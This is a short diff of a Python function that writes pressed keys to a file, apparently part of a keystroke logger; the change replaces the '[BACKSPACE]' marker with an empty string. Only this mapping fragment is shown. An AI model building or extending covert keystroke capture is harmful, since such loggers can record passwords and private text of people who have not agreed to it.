@@ -22,7 +22,7 @@ def write_to_file(key):
         elif key == 'Key.enter':
             f.write("[ENTER]")
         elif key == 'Key.backspace':
-            f.write("[BACKSPACE]")
+            f.write("")
         elif key == 'Key.tab':
             f.write("\t")
         elif key == 'Key.ctrl_l':
